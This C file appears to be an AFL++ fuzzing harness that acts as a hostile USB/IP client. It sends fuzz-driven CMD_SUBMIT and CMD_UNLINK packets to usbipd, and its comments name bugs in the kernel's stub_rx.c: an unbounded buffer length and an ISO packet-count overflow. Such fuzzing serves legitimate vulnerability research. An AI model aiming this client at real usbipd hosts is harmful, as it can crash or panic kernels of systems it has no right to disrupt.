/*
 * fuzz_stub_client.c — Malicious USB-IP client targeting usbipd stub_rx.c.
 *
 * WHAT THIS TESTS
 * ────────────────
 * The stub side (usbipd running in the QEMU VM) receives CMD_SUBMIT packets
 * from a USB-IP client and calls stub_recv_cmd_submit().  That function has:
 *
 *   1. No upper bound on transfer_buffer_length before sgl_alloc() —
 *      a huge value maps to a giant scatter-gather list → kernel OOM / KASAN.
 *
 *   2. Integer overflow in number_of_packets for ISO endpoints:
 *        kmalloc(number_of_packets * sizeof(struct usbip_iso_packet_descriptor))
 *      Same class as the vhci-hcd recv_iso bug but on the stub side.
 *
 * ARCHITECTURE
 * ─────────────
 *   VM   : usbipd running, a real USB device (or dummy_hcd) bound and exported
 *   Host : fuzz_stub_client <testcase> <vm-ip> <port>  (AFL++ target)
 *
 *   1. Client TCP-connects to usbipd on <vm-ip>:<port> (default 3240).
 *   2. Sends OP_REQ_IMPORT to claim the exported device (busid "1-1").
 *   3. Reads OP_REP_IMPORT (import accepted → now in tunnel mode).
 *   4. Sends one or more CMD_SUBMIT packets whose fields are taken from the
 *      AFL++ test-case bytes.  The 48-byte CMD_SUBMIT header union is the
 *      primary mutation target.
 *   5. Optionally reads and discards RET_SUBMIT from the stub.
 *   6. Exits; AFL++ records a crash if the VM panics and usbipd drops the
 *      connection (ECONNRESET → send_all returns -1 → main returns 1).
 *
 * AFL++ INVOCATION
 * ─────────────────
 *   afl-fuzz -S stub -i corpus/stub -o output -t 5000 \
 *     -- ./fuzz_stub_client @@ <vm-ip> 3240
 *
 * COMPILE
 * ────────
 *   afl-clang-fast -O2 -o fuzz_stub_client fuzz_stub_client.c
 */

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <unistd.h>

/* ── USB/IP protocol constants ─────────────────────────────────────────────── */
#define USBIP_VERSION       0x0111

#define OP_REQ_IMPORT       0x8003
#define OP_REP_IMPORT       0x0003

#define USBIP_CMD_SUBMIT    0x00000001
#define USBIP_CMD_UNLINK    0x00000002
#define USBIP_RET_SUBMIT    0x00000003

#define SYSFS_BUS_ID_SIZE   32
#define SYSFS_PATH_MAX      256

/* Maximum out-payload we'll actually send after a CMD_SUBMIT header */
#define MAX_OUT_PAYLOAD     (1 << 16)   /* 64 KB */

/* ── wire-format structures ─────────────────────────────────────────────────── */

struct op_common {
    uint16_t version;
    uint16_t code;
    uint32_t status;
} __attribute__((packed));

struct op_req_import {
    struct op_common hdr;
    char             busid[SYSFS_BUS_ID_SIZE];
} __attribute__((packed));

struct usbip_usb_device {
    char     path[SYSFS_PATH_MAX];
    char     busid[SYSFS_BUS_ID_SIZE];
    uint32_t busnum;
    uint32_t devnum;
    uint32_t speed;
    uint16_t idVendor;
    uint16_t idProduct;
    uint16_t bcdDevice;
    uint8_t  bDeviceClass;
    uint8_t  bDeviceSubClass;
    uint8_t  bDeviceProtocol;
    uint8_t  bConfigurationValue;
    uint8_t  bNumConfigurations;
    uint8_t  bNumInterfaces;
} __attribute__((packed));

struct op_rep_import {
    struct op_common        hdr;
    struct usbip_usb_device dev;
} __attribute__((packed));

/* 20-byte base header common to all URB PDUs */
struct usbip_header_basic {
    uint32_t command;
    uint32_t seqnum;
    uint32_t devid;
    uint32_t direction;
    uint32_t ep;
} __attribute__((packed));

/* CMD_SUBMIT union fields (28 bytes) */
struct usbip_header_cmd_submit {
    uint32_t transfer_flags;
    int32_t  transfer_buffer_length;
    int32_t  start_frame;
    int32_t  number_of_packets;
    int32_t  interval;
    uint8_t  setup[8];
} __attribute__((packed));

/* Full URB PDU header (48 bytes) */
struct usbip_header {
    struct usbip_header_basic base;
    union {
        struct usbip_header_cmd_submit  cmd_submit;
        uint8_t                         raw[28];
    } u;
} __attribute__((packed));

/* ── helpers ────────────────────────────────────────────────────────────────── */

static int recv_all(int fd, void *buf, size_t len)
{
    size_t done = 0;
    while (done < len) {
        ssize_t r = recv(fd, (char *)buf + done, len - done, 0);
        if (r <= 0)
            return -1;
        done += (size_t)r;
    }
    return 0;
}

static int send_all(int fd, const void *buf, size_t len)
{
    size_t done = 0;
    while (done < len) {
        ssize_t r = send(fd, (const char *)buf + done, len - done, MSG_NOSIGNAL);
        if (r <= 0)
            return -1;
        done += (size_t)r;
    }
    return 0;
}

/* ── import handshake ───────────────────────────────────────────────────────── */

static int do_import(int sock, const char *busid)
{
    struct op_req_import req;
    memset(&req, 0, sizeof(req));
    req.hdr.version = htons(USBIP_VERSION);
    req.hdr.code    = htons(OP_REQ_IMPORT);
    req.hdr.status  = htonl(0);
    strncpy(req.busid, busid, SYSFS_BUS_ID_SIZE - 1);

    if (send_all(sock, &req, sizeof(req)) < 0)
        return -1;

    /* Read the server's reply */
    struct op_rep_import rep;
    memset(&rep, 0, sizeof(rep));
    if (recv_all(sock, &rep, sizeof(rep)) < 0)
        return -1;

    uint16_t code   = ntohs(rep.hdr.code);
    uint32_t status = ntohl(rep.hdr.status);
    if (code != OP_REP_IMPORT || status != 0)
        return -1;

    return 0;
}

/* ── fuzzing loop ───────────────────────────────────────────────────────────── *
 *
 * Interprets the fuzz input as a stream of CMD_SUBMIT packets:
 *   [48-byte header] [transfer_buffer_length bytes OUT payload]
 *   [48-byte header] ...
 *
 * The 48-byte header is taken verbatim from fuzz bytes (with command and seqnum
 * fixed to valid values so usbipd doesn't drop the packet before parsing the
 * fields we care about: transfer_buffer_length, number_of_packets).
 *
 * transfer_buffer_length is clamped for the actual payload we send, but the
 * stub receives the UNCLAMPED value from the header, which is what triggers the
 * sgl_alloc() bug in stub_recv_cmd_submit().
 */

static int fuzz_loop(int sock, const uint8_t *fuzz, size_t fuzz_len)
{
    size_t   fuzz_off       = 0;
    uint32_t seqnum         = 1;
    uint32_t last_submit_seq = 0;   /* last CMD_SUBMIT seqnum, for CMD_UNLINK */

    /* OUT payload — static buffer of poison bytes */
    static uint8_t out_payload[MAX_OUT_PAYLOAD];
    memset(out_payload, 0xaa, sizeof(out_payload));

    while (fuzz_off + sizeof(struct usbip_header) <= fuzz_len) {
        struct usbip_header pdu;
        memset(&pdu, 0, sizeof(pdu));

        /* Overlay fuzz bytes onto the full 48-byte PDU header */
        memcpy(&pdu, fuzz + fuzz_off, sizeof(pdu));
        fuzz_off += sizeof(pdu);

        /*
         * Bit 0 of the fuzz command field selects the PDU type:
         *   0 → CMD_SUBMIT  (exercises sgl_alloc + ISO kmalloc overflow)
         *   1 → CMD_UNLINK  (exercises seqnum linked-list lookup + potential UAF)
         * CMD_UNLINK requires at least one prior CMD_SUBMIT for a valid seqnum
         * to reference; fall back to CMD_SUBMIT on the very first packet.
         */
        uint32_t fuzz_cmd = ntohl(pdu.base.command);
        if ((fuzz_cmd & 1) && last_submit_seq > 0) {
            /* ── CMD_UNLINK path ─────────────────────────────────────────── */
            pdu.base.command = htonl(USBIP_CMD_UNLINK);
            pdu.base.seqnum  = htonl(seqnum++);
            pdu.base.devid   = htonl(0x00010001);
            /* unlink_seqnum sits at the start of the 28-byte union (BE u32) */
            memset(pdu.u.raw, 0, sizeof(pdu.u.raw));
            *(uint32_t *)pdu.u.raw = htonl(last_submit_seq);
            if (send_all(sock, &pdu, sizeof(pdu)) < 0)
                return 1;
            struct usbip_header ret_ul;
            recv(sock, &ret_ul, sizeof(ret_ul), MSG_DONTWAIT);
        } else {
            /* ── CMD_SUBMIT path ─────────────────────────────────────────── */
            pdu.base.command = htonl(USBIP_CMD_SUBMIT);
            pdu.base.seqnum  = htonl(seqnum);
            last_submit_seq  = seqnum++;
            /* devid is ignored by the stub once in tunnel mode */
            pdu.base.devid   = htonl(0x00010001);

            /* Send the CMD_SUBMIT header */
            if (send_all(sock, &pdu, sizeof(pdu)) < 0)
                return 1;   /* ECONNRESET = stub panicked → AFL++ crash */

            /*
             * For OUT transfers (direction == 0) the stub expects
             * transfer_buffer_length bytes of payload after the header.
             * Send at most MAX_OUT_PAYLOAD bytes; the stub sees the full
             * (unclamped) length field in the header regardless.
             */
            uint32_t dir = ntohl(pdu.base.direction);
            if (dir == 0 /* USBIP_DIR_OUT */) {
                int32_t tbl      = ntohl(pdu.u.cmd_submit.transfer_buffer_length);
                int32_t send_len = tbl;
                if (send_len < 0)               send_len = 0;
                if (send_len > MAX_OUT_PAYLOAD)  send_len = MAX_OUT_PAYLOAD;
                if (send_len > 0) {
                    if (send_all(sock, out_payload, (size_t)send_len) < 0)
                        return 1;
                }
            }

            /*
             * Optionally drain a RET_SUBMIT from the stub (non-blocking).
             * We don't need to read it for the attack — the stub will crash
             * before replying if we've triggered the bug.  We just discard
             * whatever comes back to keep the pipe clear.
             */
            {
                struct usbip_header ret;
                recv(sock, &ret, sizeof(ret), MSG_DONTWAIT);
            }
        }
    }

    return 0;
}

/* ── entry point ─────────────────────────────────────────────────────────────── */

static uint8_t fuzz_buf[1 << 16];

int main(int argc, char *argv[])
{
    if (argc < 4) {
        fprintf(stderr,
                "usage: %s <testcase> <vm-ip> <port>\n"
                "  testcase — AFL++ @@ input file (stream of 48-byte CMD_SUBMIT headers)\n"
                "  vm-ip    — IP of QEMU VM running usbipd (e.g. 127.0.0.1)\n"
                "  port     — usbipd port (default 3240)\n",
                argv[0]);
        return 1;
    }

    const char *testcase = argv[1];
    const char *vmip     = argv[2];
    int         port     = atoi(argv[3]);

    int fd = open(testcase, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }
    ssize_t fuzz_len = read(fd, fuzz_buf, sizeof(fuzz_buf));
    close(fd);
    if (fuzz_len <= 0)
        return 0;

    signal(SIGPIPE, SIG_IGN);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return 1; }

    /* Short connect timeout — VM might not be ready */
    struct timeval tv = { .tv_sec = 3, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    int one = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)port);
    if (inet_pton(AF_INET, vmip, &sa.sin_addr) != 1) {
        fprintf(stderr, "bad address: %s\n", vmip);
        close(sock);
        return 1;
    }

    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        /* VM not reachable — not a crash */
        close(sock);
        return 0;
    }

    /* Widen I/O timeout for the fuzzing phase */
    struct timeval iotv = { .tv_sec = 0, .tv_usec = 500000 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &iotv, sizeof(iotv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &iotv, sizeof(iotv));

    if (do_import(sock, "1-1") < 0) {
        /* Import failed — stub may not be running or device not exported */
        close(sock);
        return 0;
    }

    int rc = fuzz_loop(sock, fuzz_buf, (size_t)fuzz_len);
    close(sock);
    return rc;  /* 1 = ECONNRESET = kernel panic → AFL++ crash */
}
